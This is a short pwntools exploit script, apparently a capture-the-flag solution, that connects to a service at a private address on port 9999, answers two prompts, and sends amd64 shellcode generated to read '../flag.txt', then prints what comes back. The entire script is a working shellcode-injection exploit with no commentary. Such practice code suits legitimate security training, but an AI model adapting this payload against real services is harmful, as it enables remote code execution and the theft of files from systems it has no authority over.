from pwn import *

context.arch = 'amd64'

host = "10.1.167.82"
io = remote(host, 9999)

io.recvuntil(b'open?')
io.sendline(b'test')
io.recvuntil(b'next?')

shellcode = asm(
    shellcraft.cat('../flag.txt')
)

io.sendline(shellcode)
output = io.recvall()
log.success(f"{output.decode('latin-1')}")